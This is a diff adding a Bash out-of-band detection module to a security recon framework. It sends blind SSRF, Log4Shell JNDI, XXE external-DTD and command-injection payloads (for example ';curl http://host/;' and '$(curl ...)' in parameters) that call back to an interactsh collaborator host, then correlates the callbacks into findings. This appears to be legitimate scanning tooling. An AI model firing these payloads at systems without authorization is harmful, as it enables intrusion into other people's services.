@@ -1,0 +1,232 @@
+# ============================================================
+# Recon Framework - Out-of-Band (OOB) Detection Module (v11.2)
+# Real blind-vuln detection via interactsh with per-injection
+# correlation. A callback to a unique per-injection subdomain is a
+# high-confidence CONFIRMED signal — the target must have processed
+# our payload to reach our collaborator server.
+#
+# Covers: blind SSRF (params + headers), OOB XXE, blind command
+# injection (RCE), and JNDI/Log4Shell.
+#
+# Requires: interactsh-client (ProjectDiscovery). Self-hosted server
+# supported via INTERACTSH_SERVER / INTERACTSH_TOKEN env vars.
+# ============================================================
+
+# Globals populated by oob_start
+declare -g OOB_BASE=""          # interactsh payload domain (e.g. abcd...oast.fun)
+declare -g OOB_PFX=""           # unique per-run token prefix
+declare -g OOB_PID=""           # background interactsh-client pid
+declare -g OOB_DIR=""           # working dir
+declare -g OOB_IDX=0            # injection counter
+declare -g OOB_WAIT="${OOB_WAIT:-25}"   # seconds to wait for async callbacks
+
+# Start interactsh-client, capture the payload domain. Returns non-zero if
+# the tool is missing or no domain could be obtained (caller should skip OOB).
+oob_start() {
+    local output_dir="$1"
+    OOB_DIR="$output_dir/oob"; mkdir -p "$OOB_DIR"
+    : > "$OOB_DIR/correlation.tsv"
+
+    check_tool interactsh-client || { log_warn "interactsh-client not installed — skipping OOB detection (install: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest)"; return 1; }
+
+    local args=(-json -o "$OOB_DIR/interactions.json")
+    [[ -n "${INTERACTSH_SERVER:-}" ]] && args+=(-server "$INTERACTSH_SERVER")
+    [[ -n "${INTERACTSH_TOKEN:-}"  ]] && args+=(-token "$INTERACTSH_TOKEN")
+
+    # Launch in background; tee startup + poll output to a log we can parse.
+    setsid interactsh-client "${args[@]}" > "$OOB_DIR/client.log" 2>&1 < /dev/null &
+    OOB_PID=$!
+
+    # Wait up to ~15s for the payload domain to appear in the client log.
+    local i base
+    for i in $(seq 1 30); do
+        base=$(grep -aoiE '[a-z0-9]{15,}\.(oast\.(pro|live|site|fun|online|me)|interact\.sh)' "$OOB_DIR/client.log" 2>/dev/null | head -1)
+        [[ -n "$base" ]] && break
+        # self-hosted servers won't match oast.* — fall back to INTERACTSH_SERVER host
+        if [[ -n "${INTERACTSH_SERVER:-}" ]]; then
+            base=$(grep -aoiE "[a-z0-9]{15,}\.${INTERACTSH_SERVER//./\\.}" "$OOB_DIR/client.log" 2>/dev/null | head -1)
+            [[ -n "$base" ]] && break
+        fi
+        sleep 0.5
+    done
+
+    if [[ -z "$base" ]]; then
+        log_warn "Could not obtain interactsh payload domain — skipping OOB"
+        oob_stop; return 1
+    fi
+    OOB_BASE="$base"
+    OOB_PFX="o$(head -c4 /dev/urandom 2>/dev/null | od -An -tx1 | tr -d ' \n' || echo $RANDOM)"
+    OOB_IDX=0
+    log_ok "OOB collaborator ready: *.$OOB_BASE"
+    return 0
+}
+
+# Mint a unique callback host for one injection point and record what it maps to.
+# Usage: host=$(oob_token "<vector>" "<url-or-context>")
+oob_token() {
+    local vector="$1" ctx="$2"
+    local tok="${OOB_PFX}${OOB_IDX}"
+    printf '%s\t%s\t%s\n' "$tok" "$vector" "$ctx" >> "$OOB_DIR/correlation.tsv"
+    OOB_IDX=$((OOB_IDX + 1))
+    echo "${tok}.${OOB_BASE}"
+}
+
+# Stop the background client.
+oob_stop() {
+    [[ -n "${OOB_PID:-}" ]] && kill "$OOB_PID" 2>/dev/null || true
+    OOB_PID=""
+}
+
+# Wait for async callbacks, then correlate interactions -> injections and
+# record CONFIRMED findings. interactsh flushes on its own poll interval, so
+# we give slow SSRF/queued jobs time to fire.
+oob_poll_and_correlate() {
+    [[ -n "$OOB_BASE" ]] || return 0
+    log_info "Waiting ${OOB_WAIT}s for OOB callbacks..."
+    sleep "$OOB_WAIT"
+    # let the client write out any final interactions
+    sleep 2
+
+    local inter="$OOB_DIR/interactions.json"
+    [[ -s "$inter" ]] || { log_ok "No OOB interactions received"; oob_stop; return 0; }
+
+    python3 - "$inter" "$OOB_DIR/correlation.tsv" "$OOB_DIR/confirmed.tsv" << 'PY' 2>/dev/null || true
+import json, sys
+inter, corr, out = sys.argv[1], sys.argv[2], sys.argv[3]
+# load correlation map: token -> (vector, ctx)
+cmap = {}
+for line in open(corr, encoding="utf-8", errors="ignore"):
+    p = line.rstrip("\n").split("\t")
+    if len(p) >= 3:
+        cmap[p[0]] = (p[1], p[2])
+# read interactions (json-lines, tolerate junk)
+hits = {}   # token -> set(protocols)
+raw = open(inter, encoding="utf-8", errors="ignore").read()
+objs = []
+for line in raw.splitlines():
+    line = line.strip()
+    if not line:
+        continue
+    try:
+        objs.append(json.loads(line))
+    except Exception:
+        objs.append({"_raw": line})
+for o in objs:
+    blob = json.dumps(o).lower()
+    proto = (o.get("protocol") or "oob").lower() if isinstance(o, dict) else "oob"
+    for tok in cmap:
+        if (tok + ".").lower() in blob:
+            hits.setdefault(tok, set()).add(proto)
+with open(out, "w") as f:
+    for tok, protos in hits.items():
+        vector, ctx = cmap.get(tok, ("oob", "?"))
+        f.write(f"{vector}\t{ctx}\t{','.join(sorted(protos))}\n")
+PY
+
+    if [[ -s "$OOB_DIR/confirmed.tsv" ]]; then
+        while IFS=$'\t' read -r vector ctx protos; do
+            [[ -z "$vector" ]] && continue
+            local sev="high"
+            case "$vector" in
+                rce|jndi|log4shell) sev="critical" ;;
+                xxe_oob|ssrf*)      sev="high" ;;
+            esac
+            record_finding "oob_${vector}" "$sev" "CONFIRMED" "$ctx" "out-of-band callback (${protos}) to unique collaborator token"
+        done < "$OOB_DIR/confirmed.tsv"
+    else
+        log_ok "No OOB interactions correlated to injections"
+    fi
+    oob_stop
+}
+
+# ── Main OOB orchestration ──────────────────────────────────────
+oob_detection() {
+    local target="$1" output_dir="$2"
+    oob_start "$output_dir" || return 0
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    local endpoints_file="$output_dir/endpoints/all_endpoints.txt"
+
+    # SSRF-prone parameter names.
+    local ssrf_params="url uri redirect redirect_uri redirect_url next dest destination return returnurl continue callback webhook link src source path file host domain feed site page image imageurl img proxy fetch load target out view data to u r"
+
+    # ── 1) Blind SSRF via query parameters ──────────────────────
+    if [[ -s "$param_urls" ]]; then
+        log_info "OOB: blind SSRF via parameters..."
+        head -40 "$param_urls" | while read -r url; do
+            [[ -z "$url" ]] && continue
+            local k
+            while read -r k; do
+                [[ -z "$k" ]] && continue
+                # only test parameters that look like SSRF sinks
+                echo " $ssrf_params " | grep -qiw -- "$k" || continue
+                local host; host=$(oob_token "ssrf_param" "$url [param=$k]")
+                local turl; turl=$(set_param "$url" "$k" "http://${host}/")
+                curl -skg --max-time 6 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$turl" >/dev/null 2>&1 || true
+                throttle
+            done < <(param_keys "$url")
+        done
+    fi
+
+    # ── 2) Blind SSRF / SSRF-to-JNDI via headers ────────────────
+    log_info "OOB: SSRF + JNDI via request headers..."
+    local ssrf_headers=(X-Forwarded-Host X-Forwarded-For Referer X-Api-Version X-Real-IP CF-Connecting-IP True-Client-IP X-Original-URL X-Rewrite-URL Forwarded)
+    local hdr
+    for hdr in "${ssrf_headers[@]}"; do
+        local host; host=$(oob_token "ssrf_header" "$base_url [header=$hdr]")
+        curl -skg --max-time 6 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} -H "${hdr}: http://${host}/" "$base_url" >/dev/null 2>&1 || true
+        # JNDI/Log4Shell in the same header set (still catches vulnerable Java stacks)
+        local jhost; jhost=$(oob_token "jndi" "$base_url [header=$hdr]")
+        curl -skg --max-time 6 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} -H "${hdr}: \${jndi:ldap://${jhost}/a}" "$base_url" >/dev/null 2>&1 || true
+        throttle
+    done
+    # Common log4shell probe in User-Agent
+    local ua_host; ua_host=$(oob_token "log4shell" "$base_url [User-Agent]")
+    curl -skg --max-time 6 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} -A "\${jndi:ldap://${ua_host}/a}" "$base_url" >/dev/null 2>&1 || true
+
+    # ── 3) OOB XXE (parameter-entity external DTD) ──────────────
+    if [[ -f "$endpoints_file" ]]; then
+        log_info "OOB: XXE via external DTD..."
+        grep -iE '/(api|xml|soap|import|upload|parser|rss|feed|svg)' "$endpoints_file" 2>/dev/null | head -8 | while read -r ep; do
+            [[ -z "$ep" ]] && continue
+            local host; host=$(oob_token "xxe_oob" "$ep")
+            local xxe="<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % ext SYSTEM \"http://${host}/x.dtd\">%ext;]><r>1</r>"
+            curl -skg --max-time 6 -X POST -H "Content-Type: application/xml" -d "$xxe" ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$ep" >/dev/null 2>&1 || true
+            throttle
+        done
+    fi
+
+    # ── 4) Blind command injection (RCE) via parameters ─────────
+    if [[ -s "$param_urls" ]]; then
+        log_info "OOB: blind command injection..."
+        head -20 "$param_urls" | while read -r url; do
+            [[ -z "$url" ]] && continue
+            local k
+            while read -r k; do
+                [[ -z "$k" ]] && continue
+                local host; host=$(oob_token "rce" "$url [param=$k]")
+                # nix + windows OOB primitives; nslookup/curl trigger a DNS/HTTP callback
+                local payloads=(
+                    ";curl http://${host}/;"
+                    "|curl http://${host}/|"
+                    "\$(curl http://${host}/)"
+                    "\`curl http://${host}/\`"
+                    "&&nslookup ${host}&&"
+                    "|nslookup ${host}|"
+                    "&nslookup ${host}&"
+                )
+                local p
+                for p in "${payloads[@]}"; do
+                    local turl; turl=$(set_param "$url" "$k" "$p")
+                    curl -skg --max-time 5 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$turl" >/dev/null 2>&1 || true
+                done
+                throttle
+            done < <(param_keys "$url")
+        done
+    fi
+
+    oob_poll_and_correlate
+}
